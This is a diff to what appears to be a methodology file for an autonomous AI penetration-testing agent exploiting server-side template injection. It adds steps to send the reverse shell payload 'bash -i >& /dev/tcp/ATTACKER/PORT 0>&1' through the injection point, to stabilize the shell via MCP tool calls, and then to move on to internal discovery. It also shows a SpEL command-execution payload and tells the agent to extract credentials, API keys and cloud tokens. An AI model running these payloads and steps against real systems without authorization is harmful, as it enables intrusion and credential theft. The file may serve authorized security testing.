@@ -378,11 +378,30 @@ http://TARGET/(${T(java.lang.Runtime).getRuntime().exec('id')})
 
 ## Step 8: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When RCE is confirmed, **prefer catching a reverse shell via the MCP
+shell-server** over continuing to inject commands through FreeMarker template
+payloads.
+
+1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
+2. Send a reverse shell payload through the SSTI injection point:
+   ```bash
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Use `send_command()` for all subsequent commands
+
+If the target lacks outbound connectivity, continue with inline command
+execution and note the limitation in state.md.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
 
-- **Got RCE**: Establish reverse shell, enumerate internal network, route to privesc
+- **Got RCE + shell stabilized**: STOP. Return to orchestrator recommending
+  **linux-discovery** or **windows-discovery** (based on target OS). Pass:
+  hostname, current user, shell session ID, access method, current mode.
 - **Got environment variables**: Extract database credentials, API keys, cloud tokens
 - **Got file read**: Extract application config, keystores, deployment descriptors
 - **Found SpEL in Spring**: Check for additional injection points (error pages, form validation messages)
@@ -393,6 +412,45 @@ Update `engagement/state.md` with any new credentials, access, vulns, or pivot p
 
 When routing, pass along: confirmed engine, injection point, working payload,
 syntax variant used, current mode.
+
+## Stall Detection
+
+If you have spent **5 or more tool-calling rounds** on the same failure with
+no meaningful progress — same error, no new information, no change in output
+— **stop**.
+
+**What counts as progress:**
+- Trying a variant or alternative **documented in this skill**
+- Adjusting syntax, flags, or parameters per the Troubleshooting section
+- Gaining new diagnostic information (different error, partial success)
+
+**What does NOT count as progress:**
+- Writing custom exploit code not provided in this skill
+- Inventing workarounds using techniques from other domains
+- Retrying the same command with trivially different input
+- Compiling or transferring tools not mentioned in this skill
+
+If you find yourself writing code that isn't in this skill, you have left
+methodology. That is a stall.
+
+Do not loop. Work through failures systematically:
+1. Try each variant or alternative **once**
+2. Check the Troubleshooting section for known fixes
+3. If nothing works after 5 rounds, you are stalled
+
+**When stalled, return to the orchestrator immediately with:**
+- What was attempted (commands, variants, alternatives tried)
+- What failed and why (error messages, empty responses, timeouts)
+- Assessment: **blocked** (permanent — config, patched, missing prereq) or
+  **retry-later** (may work with different context, creds, or access)
+- Update `engagement/state.md` Blocked section before returning
+
+**Mode behavior:**
+- **Guided**: Tell the user you're stalled, present what was tried, and
+  recommend the next best path.
+- **Autonomous**: Update state.md Blocked section, return findings to the
+  orchestrator. Do not retry the same technique — the orchestrator will
+  decide whether to revisit with new context or route elsewhere.
 
 ## OPSEC Notes
 
